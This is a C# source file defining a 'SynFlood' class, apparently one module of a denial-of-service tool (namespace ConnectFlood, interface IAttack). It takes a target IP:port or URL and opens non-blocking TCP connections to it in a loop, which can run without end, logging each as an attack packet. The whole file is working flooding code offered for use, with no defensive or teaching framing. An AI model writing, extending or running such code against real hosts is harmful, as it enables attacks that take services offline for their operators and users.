using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace ConnectFlood
{
    public class SynFlood : IAttack
    {
        public void StartFlood(string target, int packetCount, int speed, string none)
        {
            string ip;
            int port;

            try
            {
                if (target.StartsWith("http://") || target.StartsWith("https://"))
                {
                    Uri uri = new Uri(target);
                    ip = Dns.GetHostAddresses(uri.Host)[0].ToString();
                    port = uri.Port > 0 ? uri.Port : (uri.Scheme == "https" ? 443 : 80); 
                }
                else
                {
                    string[] targetParts = target.Split(':');
                    if (targetParts.Length != 2 || !int.TryParse(targetParts[1], out port))
                    {
                        Console.WriteLine("Invalid target format. Use: IP:PORT or http://domain.com");
                        return;
                    }
                    ip = targetParts[0];
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[SYN] Error parsing target: {ex.Message}");
                return;
            }

            Console.WriteLine($"[SYN] Attacking {ip}:{port} | Packets: {(packetCount == -1 ? "∞" : packetCount.ToString())} | Speed: {speed}ms");

            IPAddress targetIP;
            if (!IPAddress.TryParse(ip, out targetIP))
            {
                Console.WriteLine("[SYN] Invalid IP address!");
                return;
            }

            int sentPackets = 0;
            while (packetCount == -1 || sentPackets < packetCount)
            {
                try
                {
                    Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    socket.Blocking = false;
                    socket.BeginConnect(new IPEndPoint(targetIP, port), null, null);

                    sentPackets++;
                    Console.WriteLine($"[SYN] Packet {sentPackets} sent to {ip}:{port}");

                    Thread.Sleep(speed);
                }
                catch (SocketException ex)
                {
                    if (ex.SocketErrorCode == SocketError.WouldBlock || ex.SocketErrorCode == SocketError.InProgress)
                    {
                        Console.WriteLine($"[SYN] Error Connect: {ex.Message}");
                    }
                    else
                    {
                        Console.WriteLine($"[SYN] Error: {ex.Message}");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[SYN] Unexpected Error: {ex.Message}");
                }
            }
            Console.WriteLine("[SYN] Attack finished.");
        }
    }
}
